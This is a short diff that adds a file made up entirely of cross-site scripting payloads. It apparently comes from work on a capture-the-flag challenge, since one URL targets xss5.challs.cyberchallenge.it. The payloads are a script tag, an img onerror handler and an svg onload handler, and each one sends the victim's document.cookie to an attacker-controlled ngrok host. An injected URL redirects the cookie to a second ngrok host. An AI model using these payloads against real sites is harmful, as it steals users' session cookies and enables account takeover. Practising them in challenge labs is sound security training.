@@ -1,0 +1,20 @@
+
+
+
+		"> <script>   var img2 = new Image();   img2.src = "https://df0c-151-35-220-127.ngrok-free.app/?cookie=" + document.cookie; </script>
+
+
+		
+		#" alt="Test Image"
+		         onerror="fetch(`https://df0c-151-35-220-127.ngrok-free.app/?cookie=${document.cookie}`)
+		         .then(res => {return res.json(); })
+         
+
+
+         <svg/ onload="fetch(`https://df0c-151-35-220-127.ngrok-free.app/?cookie=${document.cookie}`).then(res => {return res.json(); })">
+         
+         
+         
+       
+         
+       	http://xss5.challs.cyberchallenge.it/?html=%0a%20location.href=%60https://4a5a-79-37-229-35.ngrok-free.app/?cookie=$%7Bdocument.cookie%7D%60%20%0a
